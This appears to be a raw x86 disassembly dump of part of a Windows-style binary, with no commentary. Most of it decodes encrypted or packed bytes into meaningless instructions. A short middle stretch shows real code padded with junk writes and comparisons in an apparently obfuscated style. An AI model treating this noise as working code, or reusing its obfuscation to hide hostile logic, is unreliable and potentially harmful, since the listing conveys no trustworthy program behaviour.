  40a8b3:	cmp    edi,DWORD PTR [edi]
  40a8b5:	pop    edx
  40a8b6:	sub    eax,edi
  40a8b8:	mov    eax,0x440fad7c
  40a8bd:	jp     0x40a916
  40a8bf:	or     DWORD PTR [ecx+eax*4+0x29],ebp
  40a8c3:	inc    esp
  40a8c4:	or     al,0xb8
  40a8c6:	sbb    ah,BYTE PTR [esi-0x56]
  40a8c9:	sbb    DWORD PTR [ebx],esi
  40a8cb:	out    dx,al
  40a8cc:	pop    edx
  40a8cd:	daa    
  40a8ce:	mov    edi,0xa952f83a
  40a8d3:	push   edi
  40a8d4:	mov    ecx,0x341fa017
  40a8d9:	push   edi
  40a8da:	or     ah,BYTE PTR [ecx+0x7b]
  40a8dd:	push   ebx
  40a8de:	mov    bh,0x49
  40a8e0:	call   0xee85:0xb299a20e
  40a8e7:	xor    eax,0x8e9f8873
  40a8ec:	jmpw   0xac68
  40a8f0:	jp     0x40a950
  40a8f2:	shl    edx,1
  40a8f4:	pop    ebp
  40a8f5:	mov    dh,0x3a
  40a8f7:	sub    esi,DWORD PTR [esp+ecx*8]
  40a8fa:	jle    0x40a97a
  40a8fc:	call   0x5ce8ed9a
  40a901:	mov    DWORD PTR [ebp+ebp*4+0x48df8023],esp
  40a908:	mov    ah,0x95
  40a90a:	push   ecx
  40a90b:	cmp    al,0x7a
  40a90d:	xchg   dl,ah
  40a90f:	fcom   QWORD PTR [edx]
  40a911:	or     bh,BYTE PTR [esp+ecx*1]
  40a914:	cwde   
  40a915:	sbb    BYTE PTR [esi-0xe],dl
  40a918:	sahf   
  40a919:	or     al,0xb6
  40a91b:	mov    ecx,0xd583c756
  40a920:	sti    
  40a921:	outs   dx,BYTE PTR ds:[esi]
  40a922:	iret   
  40a923:	jnp    0x40a95d
  40a925:	ret    0x2e78
  40a928:	mov    ebp,0x638206e6
  40a92d:	mov    esi,0x1a241e17
  40a932:	outs   dx,DWORD PTR ds:[esi]
  40a933:	ds loope 0x40a8c0
  40a936:	jns    0x40a8c0
  40a938:	icebp  
  40a939:	push   eax
  40a93a:	add    ebp,DWORD PTR [eax-0x6c6bbecf]
  40a940:	loop   0x40a9a1
  40a942:	aaa    
  40a943:	push   edx
  40a944:	xchg   edx,eax
  40a945:	lea    ecx,[ebx+0x2f]
  40a948:	cmp    dh,ch
  40a94a:	jle    0x40a91e
  40a94c:	sbb    al,0xfa
  40a94e:	sbb    eax,0xc7854936
  40a953:	mov    dh,BYTE PTR [ecx-0x4c]
  40a956:	dec    ebx
  40a957:	ret    0x28b9
  40a95a:	jo     0x40a968
  40a95c:	xchg   esi,eax
  40a95d:	sub    edi,DWORD PTR [edi-0x53f94677]
  40a963:	adc    BYTE PTR [edi+ebp*4+0x73d4ed9a],dl
  40a96a:	arpl   WORD PTR [esi],di
  40a96c:	adc    al,0x48
  40a96e:	add    BYTE PTR [ecx-0x5cad7b43],al
  40a974:	cld    
  40a975:	int    0x85
  40a977:	adc    DWORD PTR [esi],0x8de4b265
  40a97d:	fstp   QWORD PTR [edi+0x28]
  40a980:	(bad)  
  40a981:	mov    ah,0x85
  40a983:	or     eax,0x8a10f74a
  40a988:	push   ebx
  40a989:	into   
  40a98a:	and    esi,DWORD PTR [ebx+0x4f]
  40a98d:	icebp  
  40a98e:	mov    al,0x7d
  40a990:	cmp    eax,0x3c5ceb7a
  40a995:	fmul   DWORD PTR [edx]
  40a997:	enter  0x6436,0xe9
  40a99b:	out    0xca,eax
  40a99d:	xor    eax,0xdeb94070
  40a9a2:	and    edx,ebx
  40a9a4:	jp     0x40a9d7
  40a9a6:	aaa    
  40a9a7:	(bad)  
  40a9a8:	loopne 0x40a92c
  40a9aa:	sub    eax,0x26ef68c1
  40a9af:	sub    esp,DWORD PTR [ebx]
  40a9b1:	mov    edi,0x8080321e
  40a9b6:	rol    DWORD PTR [esi+eax*8],cl
  40a9b9:	loop   0x40aa11
  40a9bb:	sbb    BYTE PTR [eax+esi*2-0x5365ccad],bh
  40a9c2:	clc    
  40a9c3:	push   ebp
  40a9c4:	fstp   DWORD PTR [eax]
  40a9c6:	cmp    DWORD PTR [edx+esi*8-0x454339e5],edi
  40a9cd:	call   0x1854:0xa89fcd9
  40a9d4:	call   0xe6e6:0x4814761b
  40a9db:	pop    es
  40a9dc:	or     eax,0x47416736
  40a9e1:	xchg   ebp,eax
  40a9e2:	and    BYTE PTR [edx-0x46],ah
  40a9e5:	iret   
  40a9e6:	sbb    eax,0xa9e98e1d
  40a9eb:	push   ecx
  40a9ec:	xchg   edi,eax
  40a9ed:	xor    DWORD PTR [esi-0x46],ebp
  40a9f0:	pusha  
  40a9f1:	jmp    0x75cb:0xa40e7d68
  40a9f8:	and    al,cl
  40a9fa:	mov    al,0x91
  40a9fc:	mov    eax,ds:0x32560ac8
  40aa01:	rcr    BYTE PTR [ecx],cl
  40aa03:	mov    ebx,0xc8b2304a
  40aa08:	loopne 0x40a9f1
  40aa0a:	out    0x4a,al
  40aa0c:	fstp   DWORD PTR [ebx+0x58]
  40aa0f:	shr    BYTE PTR [edx+eax*1],cl
  40aa12:	in     eax,dx
  40aa13:	push   es
  40aa14:	jb     0x40a9d5
  40aa16:	push   esp
  40aa17:	popf   
  40aa18:	imul   esi,DWORD PTR [ecx],0x3818cba
  40aa1e:	imul   ecx,esp,0x2156f9ba
  40aa24:	imul   ebx,DWORD PTR [eax],0xaad853c8
  40aa2a:	adc    al,0x65
  40aa2c:	imul   ecx,DWORD PTR [edi],0x77c9623c
  40aa32:	retf   
  40aa33:	cdq    
  40aa34:	popf   
  40aa35:	inc    ebp
  40aa36:	loope  0x40a9e6
  40aa38:	adc    ebp,DWORD PTR [ebx]
  40aa3a:	aam    0x38
  40aa3c:	dec    ebx
  40aa3d:	mov    ebx,0x81d49d87
  40aa42:	daa    
  40aa43:	ins    DWORD PTR es:[edi],dx
  40aa44:	cmp    al,0x5f
  40aa46:	sub    cl,0x50
  40aa49:	cmp    dl,BYTE PTR [esi-0x69]
  40aa4c:	adc    eax,0x86e9b0dd
  40aa51:	sub    al,0xa6
  40aa53:	cmc    
  40aa54:	cmp    al,BYTE PTR [ecx+0x5a6ff39e]
  40aa5a:	iret   
  40aa5b:	out    dx,eax
  40aa5c:	das    
  40aa5d:	scas   eax,DWORD PTR es:[edi]
  40aa5e:	shl    al,0x35
  40aa61:	aas    
  40aa62:	cmp    DWORD PTR [eax],ecx
  40aa64:	aad    0x2
  40aa66:	cdq    
  40aa67:	fcomp  DWORD PTR [edx+0x51cdca56]
  40aa6d:	mov    ss,ecx
  40aa6f:	adc    al,cl
  40aa71:	jb     0x40aa30
  40aa73:	test   eax,0x31690e26
  40aa78:	dec    esi
  40aa79:	mov    es,WORD PTR [ecx+eax*4+0x923cd25]
  40aa80:	mov    BYTE PTR [eax-0x44],0xf3
  40aa84:	mov    eax,0xff45a863
  40aa89:	mul    DWORD PTR [esp+ebp*4]
  40aa8c:	xchg   BYTE PTR [ecx+eiz*4+0x2c00b747],ch
  40aa93:	mulps  xmm5,XMMWORD PTR [esi]
  40aa96:	xchg   esp,eax
  40aa97:	in     al,0x4b
  40aa99:	or     eax,0x1a26bcaa
  40aa9e:	pop    ebp
  40aa9f:	push   ecx
  40aaa0:	push   0xbb8feac
  40aaa5:	cmp    DWORD PTR [esi-0x34],eax
  40aaa8:	mov    bl,0xd5
  40aaaa:	add    cl,BYTE PTR [edi-0x59]
  40aaad:	inc    ecx
  40aaae:	adc    esi,ebp
  40aab0:	sbb    DWORD PTR [ebp+eax*1+0xac99d99],ecx
  40aab7:	push   eax
  40aab8:	mov    dl,0x2
  40aaba:	xchg   esi,eax
  40aabb:	mov    edx,0xfd9bcca0
  40aac0:	xchg   edx,eax
  40aac1:	push   edx
  40aac2:	call   0xa63f:0x57fd6b9b
  40aac9:	and    cl,ah
  40aacb:	pushf  
  40aacc:	shr    bl,cl
  40aace:	push   0xda99f066
  40aad3:	dec    eax
  40aad4:	xchg   edi,edi
  40aad6:	mov    ebx,0x18cca3fe
  40aadb:	enter  0x7c67,0xee
  40aadf:	ds cmp al,0x9
  40aae2:	pop    eax
  40aae3:	dec    edx
  40aae4:	(bad)  
  40aae5:	lea    edx,[ecx]
  40aae7:	nop
  40aae8:	adc    ecx,DWORD PTR [eax+0x6b]
  40aaeb:	fild   QWORD PTR ds:0xbab8c21d
  40aaf1:	mov    edi,DWORD PTR cs:[edi-0x45]
  40aaf5:	test   al,0x61
  40aaf7:	ja     0x40aad6
  40aaf9:	and    dh,BYTE PTR [edi-0x34]
  40aafc:	test   BYTE PTR cs:[esi-0x763fc6bb],cl
  40ab03:	xor    BYTE PTR [ecx+edi*2],cl
  40ab06:	xchg   esi,eax
  40ab07:	loope  0x40ab56
  40ab09:	(bad)  
  40ab0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab0b:	mov    esp,0x4ed1a0e4
  40ab10:	cmp    BYTE PTR ds:0xd2d4b6eb,dh
  40ab16:	xor    BYTE PTR [edi],ah
  40ab18:	jecxz  0x40aad7
  40ab1a:	or     DWORD PTR [ebp-0xaa3532a],0xffffff94
  40ab21:	outs   dx,BYTE PTR ds:[esi]
  40ab22:	pushf  
  40ab23:	test   eax,0xec1f6ed4
  40ab28:	(bad)  
  40ab29:	icebp  
  40ab2a:	xlat   BYTE PTR ds:[ebx]
  40ab2b:	mov    al,0x64
  40ab2d:	mov    dh,0xeb
  40ab2f:	jg     0x40ab02
  40ab31:	mov    eax,ds:0x17bf5511
  40ab36:	add    DWORD PTR [edi-0x1f],ecx
  40ab39:	test   ch,dl
  40ab3b:	add    DWORD PTR [esp+ebx*4-0x31ccbd41],0xa2e605c7
  40ab46:	inc    edx
  40ab47:	add    BYTE PTR [edx+eax*1+0x0],dl
  40ab4b:	add    BYTE PTR [ebx],bh
  40ab4d:	enter  0x840f,0xbd
  40ab51:	and    eax,0x458b0000
  40ab56:	cld    
  40ab57:	and    DWORD PTR ds:0x42a28a,0x5384
  40ab61:	xor    eax,esi
  40ab63:	add    DWORD PTR ds:0x42a2fa,0x7b59
  40ab6d:	add    eax,edi
  40ab6f:	cmp    ebx,eax
  40ab71:	mov    DWORD PTR ds:0x42a2e6,0x2910
  40ab7b:	jne    0x40d0af
  40ab81:	xor    DWORD PTR ds:0x42a276,0x42a2d6
  40ab8b:	push   DWORD PTR [ebp+0x8]
  40ab8e:	call   0x424efb
  40ab93:	and    DWORD PTR ds:0x42a266,edi
  40ab99:	mov    DWORD PTR [ebp-0x14],eax
  40ab9c:	xor    ecx,ecx
  40ab9e:	xor    ecx,DWORD PTR ds:0x42a306
  40aba4:	mov    eax,ds:0x42a3a2
  40aba9:	sub    ecx,eax
  40abab:	or     ecx,DWORD PTR [ecx+eax*1]
  40abae:	mov    eax,DWORD PTR [ebp-0x4]
  40abb1:	sbb    ecx,0x17a4
  40abb7:	mov    ecx,DWORD PTR [ebp-0x14]
  40abba:	xor    DWORD PTR ds:0x42a28a,0x42a2a6
  40abc4:	xor    eax,esi
  40abc6:	add    eax,edi
  40abc8:	mov    DWORD PTR ds:0x42a25a,0x307a
  40abd2:	cmp    ecx,eax
  40abd4:	mov    DWORD PTR ds:0x42a2be,0xd4
  40abde:	je     0x40d1cc
  40abe4:	or     DWORD PTR ds:0x42a2c6,0x42a266
  40abee:	push   DWORD PTR [ebp-0x14]
  40abf1:	not    DWORD PTR ds:0x42a2a6
  40abf7:	push   DWORD PTR [ebp+0x8]
  40abfa:	sbb    DWORD PTR ds:0x42a2ae,0x3b6a
  40ac04:	call   0x424fbb
  40ac09:	mov    DWORD PTR [ebp-0x14],eax
  40ac0c:	or     eax,DWORD PTR ds:0x42a2be
  40ac12:	mov    eax,DWORD PTR [ebp-0x4]
  40ac15:	mov    ecx,DWORD PTR [ebp-0x14]
  40ac18:	xor    eax,esi
  40ac1a:	and    DWORD PTR ds:0x42a2da,0x42a2fe
  40ac24:	add    eax,edi
  40ac26:	cmp    ecx,eax
  40ac28:	mov    DWORD PTR ds:0x42a2d6,0x7d26
  40ac32:	je     0x40d1cc
  40ac38:	xor    ecx,DWORD PTR ds:0x42a2ea
  40ac3e:	mov    eax,DWORD PTR [ebp-0x14]
  40ac41:	mov    eax,DWORD PTR [eax+0x18]
  40ac44:	or     DWORD PTR ds:0x42a29a,0x5e55
  40ac4e:	mov    DWORD PTR [ebp-0x24],eax
  40ac51:	xor    DWORD PTR ds:0x42a2be,ecx
  40ac57:	mov    eax,DWORD PTR [ebp-0x14]
  40ac5a:	and    DWORD PTR ds:0x42a2ee,0x0
  40ac64:	mov    ecx,DWORD PTR ds:0x42a2ee
  40ac6a:	inc    ecx
  40ac6b:	mov    DWORD PTR ds:0x42a2ee,ecx
  40ac71:	cmp    DWORD PTR ds:0x42a2ee,0x1f
  40ac78:	jb     0x40acb0
  40ac7e:	jmp    0x40aca3
  40ac83:	push   DWORD PTR [ebp-0x28]
  40ac86:	push   0x6caa
  40ac8b:	push   0x1820
  40ac90:	push   0x670f
  40ac95:	push   0x3854
  40ac9a:	push   DWORD PTR [ebp-0x24]
  40ac9d:	call   DWORD PTR ds:0x42a3c2
  40aca3:	cmp    DWORD PTR ds:0x42a2ee,0x14
  40acaa:	jb     0x40ac64
  40acb0:	mov    ecx,DWORD PTR [ebp+0x8]
  40acb3:	add    ecx,DWORD PTR [eax+0x20]
  40acb6:	movzx  eax,BYTE PTR ds:0x42a2e6
  40acbd:	adc    DWORD PTR ds:0x42a286,eax
  40acc3:	mov    DWORD PTR [ebp-0x2c],ecx
  40acc6:	adc    DWORD PTR ds:0x42a2b6,ecx
  40accc:	mov    eax,DWORD PTR [ebp-0x14]
  40accf:	sbb    ecx,DWORD PTR ds:0x42a262
  40acd5:	jmp    0x40d063
  40acda:	test   BYTE PTR fs:[esi],bl
  40acdd:	pop    es
  40acde:	sahf   
  40acdf:	and    DWORD PTR [edx-0x80],0x235b4cfa
  40ace6:	mov    ebp,0x588113f9
  40aceb:	lock add DWORD PTR [ebx-0x7c7ca1f4],0x7c
  40acf3:	div    BYTE PTR [esi-0x5912794]
  40acf9:	sub    eax,0xfe19aaa2
  40acfe:	out    0x32,al
  40ad00:	jae    0x40acc7
  40ad02:	cld    
  40ad03:	fxch   st(5)
  40ad05:	push   0x62
  40ad07:	dec    edx
  40ad08:	lods   al,BYTE PTR ds:[esi]
  40ad09:	fst    QWORD PTR gs:[esi+0x7d]
  40ad0d:	push   edi
  40ad0e:	xchg   DWORD PTR [ebx+0x3],ecx
  40ad11:	jmp    0x40acf1
  40ad13:	or     DWORD PTR [edx+ebp*2],edi
  40ad16:	fistp  QWORD PTR [edx+ecx*2]
  40ad19:	out    dx,al
  40ad1a:	xor    BYTE PTR [eax+0x3d],al
  40ad1d:	pop    ebx
  40ad1e:	xor    al,ch
  40ad20:	out    dx,al
  40ad21:	jmp    0x40ad7d
  40ad23:	(bad)  
  40ad25:	xchg   ebp,edi
  40ad27:	sub    al,0x90
  40ad29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad2a:	in     eax,0x4a
  40ad2c:	addr16 jno 0x40acf5
  40ad2f:	xor    al,0x5a
  40ad31:	mov    DWORD PTR [edx],ecx
  40ad33:	out    dx,al
  40ad34:	cmp    ah,BYTE PTR [ebp+0x3720e29a]
  40ad3a:	inc    edx
  40ad3b:	mov    DWORD PTR [ebx+0x69b45d9a],edx
  40ad41:	es mov ebx,0xb1d2c88c
  40ad47:	fild   QWORD PTR [esi*4+0xa629e0a]
  40ad4e:	push   cs
  40ad4f:	inc    ebx
  40ad50:	ds int 0xf2
  40ad53:	sbb    BYTE PTR [esi-0x68b9a8a7],0x66
  40ad5a:	dec    eax
  40ad5b:	(bad)  
  40ad5c:	ins    BYTE PTR es:[edi],dx
  40ad5d:	or     edi,DWORD PTR [eax]
  40ad5f:	in     al,dx
  40ad60:	test   BYTE PTR [eax+0x3c39ef96],dh
  40ad66:	sub    al,0xb4
  40ad68:	ret    
  40ad69:	cmc    
  40ad6a:	dec    eax
  40ad6b:	fsubr  DWORD PTR [ecx-0x4e]
  40ad6e:	cld    
  40ad6f:	fwait
  40ad70:	sub    edx,DWORD PTR gs:[ecx-0x34]
  40ad74:	sub    DWORD PTR [edi-0x6],0x23
  40ad78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad79:	xor    dh,BYTE PTR [edx+0x447917f9]
  40ad7f:	hlt    
  40ad80:	fbstp  TBYTE PTR [eax+0x19]
  40ad83:	sbb    DWORD PTR [ecx+0x68b582db],0x2fafc359
  40ad8d:	jae    0x40ad1b
  40ad8f:	push   es
  40ad90:	int    0x35
  40ad92:	arpl   WORD PTR [ebx+ebx*2-0x7c],bx
  40ad96:	mov    esp,0xc4ff9bed
  40ad9b:	out    dx,eax
  40ad9c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40ad9e:	fld    QWORD PTR [ecx+ecx*2]
  40ada1:	and    BYTE PTR [eax],bl
  40ada3:	addr16 fdivr st,st(7)
  40ada6:	jl     0x40ad75
  40ada8:	popf   
  40ada9:	add    eax,0xa01657bc
  40adae:	popf   
  40adaf:	cmp    bh,BYTE PTR [ebp-0x55]
  40adb2:	jmp    0x40ad5f
  40adb4:	pop    esi
  40adb5:	mov    eax,ds:0xcda6e3c3
  40adba:	lds    esi,FWORD PTR [ecx-0x3fa96c66]
  40adc0:	out    dx,al
  40adc1:	push   ebp
  40adc2:	ficom  DWORD PTR [esp+ebp*8]
  40adc5:	imul   ecx,DWORD PTR [eax+0x5139129e],0x847cd7f9
  40adcf:	popa   
  40add0:	inc    edi
  40add1:	sub    bl,BYTE PTR [eax]
  40add3:	imul   ebp,esi,0x41
  40add6:	xchg   esi,eax
  40add7:	ret    
  40add8:	mov    es,ebx
  40adda:	fbstp  TBYTE PTR [esi+esi*1+0x15]
  40adde:	stc    
  40addf:	outs   dx,BYTE PTR ds:[esi]
  40ade0:	jae    0x40ad9b
  40ade2:	(bad)  
  40ade3:	repz mov es,WORD PTR [edi-0xb0ec20f]
  40adea:	stos   BYTE PTR es:[edi],al
  40adeb:	ret    
  40adec:	pop    ebx
  40aded:	push   ebp
  40adee:	pop    ds
  40adef:	xor    ecx,DWORD PTR [eax-0x7]
  40adf2:	je     0x40ad7a
  40adf4:	mov    dl,0x4a
  40adf6:	dec    ebx
  40adf7:	and    ecx,DWORD PTR [eax+0x55]
  40adfa:	ficom  WORD PTR [esi-0x2e]
  40adfd:	loopne 0x40adb3
  40adff:	xchg   DWORD PTR [ebx+0x6923be0f],esp
  40ae05:	push   ecx
  40ae06:	dec    eax
  40ae07:	stc    
  40ae08:	add    BYTE PTR [edx],ah
  40ae0a:	loopne 0x40adbf
  40ae0c:	cmp    ah,BYTE PTR ds:0x640afd32
  40ae12:	jbe    0x40ae44
  40ae14:	xor    dh,bl
  40ae16:	add    al,0xc9
  40ae18:	das    
  40ae19:	scas   eax,DWORD PTR es:[edi]
  40ae1a:	fnsave fs:[ecx-0x74a23cfe]
  40ae21:	cmp    edi,DWORD PTR [edi]
  40ae23:	mov    ds:0xb69dd409,al
  40ae28:	(bad)  
  40ae29:	icebp  
  40ae2a:	inc    esp
  40ae2b:	retf   0xc204
  40ae2e:	ins    BYTE PTR es:[edi],dx
  40ae2f:	adc    DWORD PTR [ebx+esi*2-0x22],eax
  40ae33:	push   cs
  40ae34:	std    
  40ae35:	hlt    
  40ae36:	and    ebp,eax
  40ae38:	push   ebx
  40ae39:	retf   
  40ae3a:	sub    DWORD PTR [eax-0x278da51d],0x2635c12d
  40ae44:	cmp    dh,BYTE PTR [edx+0x6d29da36]
  40ae4a:	retf   0xc3a8
  40ae4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae4e:	clc    
  40ae4f:	sar    DWORD PTR [edx-0x18c34b14],1
  40ae55:	mov    BYTE PTR [ecx+0x69],dh
  40ae58:	enter  0xd4d,0xf8
  40ae5c:	loop   0x40ade6
  40ae5e:	jne    0x40ae18
  40ae60:	pop    ecx
  40ae61:	adc    cl,BYTE PTR [ecx+0x28048c]
  40ae67:	stos   DWORD PTR es:[edi],eax
  40ae68:	retf   0x4668
  40ae6b:	dec    DWORD PTR [esi+0x26e62f1c]
  40ae71:	out    dx,eax
  40ae72:	clc    
  40ae73:	aaa    
  40ae74:	loop   0x40ae6a
  40ae76:	jnp    0x40ae96
  40ae78:	lds    ebp,FWORD PTR [eax]
  40ae7a:	dec    ecx
  40ae7b:	add    edx,DWORD PTR [edx-0x5a72ea9a]
  40ae81:	jecxz  0x40ae11
  40ae83:	or     dl,BYTE PTR [esi]
  40ae85:	outs   dx,DWORD PTR ds:[esi]
  40ae86:	push   esp
  40ae87:	das    
  40ae88:	mov    BYTE PTR ds:0x416339e7,al
  40ae8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae8f:	mov    esi,0x134e418e
  40ae94:	and    al,0x8d
  40ae96:	push   ss
  40ae97:	push   edi
  40ae98:	in     al,dx
  40ae99:	mov    al,0x33
  40ae9b:	gs sub eax,0x4cc6e579
  40aea1:	sub    DWORD PTR [edx],0xd64a797
  40aea7:	pop    ebx
  40aea8:	or     ecx,eax
  40aeaa:	push   ebp
  40aeab:	cmp    bl,BYTE PTR [ebx-0x79e479ff]
  40aeb1:	jle    0x40ae60
  40aeb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeb4:	dec    BYTE PTR [ecx+0xc]
  40aeb7:	fsub   QWORD PTR [esi-0x59c61071]
  40aebd:	cmp    al,0x67
  40aebf:	or     eax,0xc41864cb
  40aec4:	inc    edx
  40aec5:	pop    ds
  40aec6:	mov    eax,0xb9aa7deb
  40aecb:	or     ecx,esp
  40aecd:	jae    0x40aead
  40aecf:	call   0xdabc70d1
  40aed4:	in     eax,0x88
  40aed6:	xchg   esp,eax
  40aed7:	ret    
  40aed8:	outs   dx,DWORD PTR ds:[esi]
  40aed9:	cld    
  40aeda:	outs   dx,DWORD PTR ds:[esi]
  40aedb:	clc    
  40aedc:	icebp  
  40aedd:	dec    ebp
  40aede:	jo     0x40ae75
  40aee0:	inc    ebx
  40aee1:	push   es
  40aee2:	push   DWORD PTR [edi-0x2c]
  40aee5:	lds    eax,FWORD PTR [eax-0x7ed48779]
  40aeeb:	sbb    DWORD PTR [esi+0x60],edi
  40aeee:	xor    edi,esp
  40aef0:	mov    ch,0x7a
  40aef2:	retf   
  40aef3:	jp     0x40ae7e
  40aef5:	sbb    edx,DWORD PTR [esi+0x18]
  40aef8:	jns    0x40af45
  40aefa:	mov    BYTE PTR [edx+edx*4],cl
  40aefd:	and    ah,BYTE PTR [eax]
  40aeff:	mov    esi,ebx
  40af01:	jl     0x40ae9a
  40af03:	pop    esi
  40af04:	fidiv  WORD PTR [edi-0x934ffb6]
  40af0a:	mov    ch,0x66
  40af0c:	mov    edx,0xf1d535ae
  40af11:	mov    dl,0x13
  40af13:	std    
  40af14:	add    dh,BYTE PTR [edi-0x78]
  40af17:	push   ebp
  40af18:	pop    ebp
  40af19:	and    DWORD PTR [ecx],0x5c
  40af1c:	outs   dx,BYTE PTR ds:[esi]
  40af1d:	push   eax
  40af1e:	sbb    DWORD PTR [eax-0x53],ebx
  40af21:	nop
  40af22:	and    ch,ah
  40af24:	pop    ss
  40af25:	push   ecx
  40af26:	add    ch,BYTE PTR [ecx+0x396bad96]
  40af2c:	mov    ecx,cs
  40af2e:	(bad)  
  40af2f:	mov    ebx,0xfe22c718
  40af34:	cmp    ebx,DWORD PTR [ecx+0x41f9c5d7]
  40af3a:	mov    ds:0xebe9ea83,eax
  40af3f:	push   ebx
  40af40:	xchg   BYTE PTR [ebx-0x70],ah
  40af43:	pushf  
  40af44:	jl     0x40afaa
  40af46:	test   bh,dl
  40af48:	out    dx,eax
  40af49:	stc    
  40af4a:	xor    bh,BYTE PTR [edi]
  40af4c:	test   eax,0xc45421de
  40af51:	pop    ds
  40af52:	ret    0xac50
  40af55:	mov    ds:0x51c6f73b,al
  40af5a:	or     edx,esp
  40af5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af5d:	mov    ch,0x22
  40af5f:	sbb    BYTE PTR [eax+edx*4+0x58],cl
  40af63:	sub    DWORD PTR [ebx-0xb8d5d81],ebp
  40af69:	mov    edi,DWORD PTR [ecx+ecx*4-0x2d874cbf]
  40af70:	dec    edi
  40af71:	rcr    DWORD PTR [edi-0x367db0bc],0xe4
  40af78:	jl     0x40af0c
  40af7a:	pop    edx
  40af7b:	loopne 0x40af75
  40af7d:	in     eax,dx
  40af7e:	lods   eax,DWORD PTR ds:[esi]
  40af7f:	out    0x15,al
  40af81:	imul   ebp,DWORD PTR [ebx+0x33],0x4f744064
  40af88:	xchg   DWORD PTR [ecx],edi
  40af8a:	xor    BYTE PTR [edi+0x6ecebca6],al
  40af90:	out    dx,al
  40af91:	les    ebx,FWORD PTR [ebx-0x4e]
  40af94:	and    DWORD PTR [esi-0x639f10f4],esi
  40af9a:	(bad)  
  40af9b:	(bad)  
  40af9c:	push   ebp
  40af9d:	mov    eax,ss:0x1d89fccb
  40afa3:	dec    ebx
  40afa4:	ror    BYTE PTR [ecx+ebx*8+0x16],cl
  40afa8:	mov    fs,WORD PTR [esi+0x30]
  40afab:	ret    
  40afac:	adc    al,0x32
  40afae:	sahf   
  40afaf:	or     DWORD PTR [esi],ebp
  40afb1:	daa    
  40afb2:	cmp    DWORD PTR [esp+edx*2+0x35],0xffffff84
  40afb7:	and    eax,0x690f88c4
  40afbc:	mov    al,ds:0x6b38613e
  40afc1:	aam    0x47
  40afc3:	and    eax,ecx
  40afc5:	jle    0x40af72
  40afc7:	or     DWORD PTR ds:0x41f89c69,edx
  40afcd:	loop   0x40af7b
  40afcf:	mov    edi,0xc462b7c9
  40afd4:	xchg   ecx,eax
  40afd5:	stos   BYTE PTR es:[edi],al
  40afd6:	neg    bl
  40afd8:	inc    ebx
  40afd9:	jl     0x40aff9
  40afdb:	lahf   
  40afdc:	cdq    
  40afdd:	clc    
  40afde:	lods   eax,DWORD PTR ds:[esi]
  40afdf:	jl     0x40afad
  40afe1:	rcr    ebp,0xbb
  40afe4:	add    al,0xf7
  40afe6:	push   0xffffffc7
  40afe8:	(bad)  
  40afe9:	ds std 
  40afeb:	not    ecx
  40afed:	ret    
  40afee:	push   ss
  40afef:	outs   dx,DWORD PTR ds:[esi]
  40aff0:	sti    
  40aff1:	ins    DWORD PTR es:[edi],dx
  40aff2:	sub    eax,DWORD PTR ds:0x45df8ee9
  40aff8:	enter  0x7384,0x5b
  40affc:	ins    BYTE PTR es:[edi],dx
  40affd:	ins    DWORD PTR es:[edi],dx
  40affe:	mov    ch,0xf4
  40b000:	adc    eax,0xd3057ace
  40b005:	repnz and BYTE PTR [edx+0x6a],bl
  40b009:	jg     0x40b043
  40b00b:	mov    edx,DWORD PTR [ecx+0x58]
  40b00e:	sub    eax,ebp
  40b010:	push   eax
  40b011:	pushf  
  40b012:	fadd   DWORD PTR [ecx-0x2e]
  40b015:	in     al,0xf2
  40b017:	mov    eax,0x41ad0980
  40b01c:	and    esi,DWORD PTR [ebx+0x4d397ec4]
  40b022:	cli    
  40b023:	and    DWORD PTR [esi-0x19],eax
  40b026:	pop    edi
  40b027:	xor    BYTE PTR ss:[esi+0x28],dh
  40b02b:	cmp    DWORD PTR [edx-0x70],edx
  40b02e:	ss dec ebx
  40b030:	push   es
  40b031:	mov    dh,0xb4
  40b033:	add    eax,0xb8c6d2e0
  40b038:	data16 (bad) 
  40b03a:	in     eax,dx
  40b03b:	fadd   DWORD PTR [eax+0x31]
  40b03e:	and    esp,DWORD PTR [ebx-0x5]
  40b041:	fmul   QWORD PTR [esi-0x751af19]
  40b047:	adc    eax,0x3caf2923
  40b04c:	aas    
  40b04d:	dec    edx
  40b04f:	fsubr  DWORD PTR [esi]
  40b051:	mov    ebx,0x31fb92b1
  40b056:	sub    cl,dh
  40b058:	xchg   ebx,eax
  40b059:	out    0x9e,eax
  40b05b:	bound  esi,QWORD PTR [ebx+ecx*1+0x4e699e24]
  40b062:	xchg   BYTE PTR [eax],bl
  40b064:	xor    ecx,DWORD PTR ds:0x9d77c05f
  40b06a:	add    eax,0x55c70be1
  40b06f:	sub    DWORD PTR [edi-0x7129d077],ebp
  40b075:	push   ds
  40b076:	test   eax,0xf045cc89
  40b07b:	frstor [esp+eax*1]
  40b07e:	test   eax,0x1aa64870
  40b083:	cmp    esp,DWORD PTR [esi-0x62d504d7]
  40b089:	shr    BYTE PTR [eax-0x80],0x62
  40b08d:	(bad)  
  40b08e:	imul   esp,ebx,0xffffffc6
  40b091:	test   DWORD PTR [eax-0x66ba203a],0xd81f9cb
  40b09b:	ss out 0x76,al
  40b09e:	cs mov esp,0x6b10d80
  40b0a4:	nop
  40b0a5:	jne    0x40b094
  40b0a7:	ja     0x40b08c
  40b0a9:	sub    al,0x73
  40b0ab:	je     0x40b120
  40b0ad:	sbb    ch,BYTE PTR [esi]
  40b0af:	pop    ecx
  40b0b0:	jns    0x40b07c
  40b0b2:	stos   DWORD PTR es:[edi],eax
  40b0b3:	pusha  
  40b0b4:	mov    dl,0xf3
  40b0b6:	mov    esi,0x29fd4635
  40b0bb:	xor    eax,0x66dff3ad
  40b0c0:	addr16 mov edi,0x7514731
  40b0c6:	jb     0x40b0bb
  40b0c8:	leave  
  40b0c9:	inc    edi
  40b0ca:	aas    
  40b0cb:	cmc    
  40b0cc:	push   edi
  40b0cd:	jg     0x40b121
  40b0cf:	out    dx,eax
  40b0d0:	es jmp 0x40b09f
  40b0d3:	mov    ah,0xa5
  40b0d5:	jmp    0xa054af2a
  40b0da:	in     al,dx
  40b0db:	mov    db6,edx
  40b0de:	in     al,0xcd
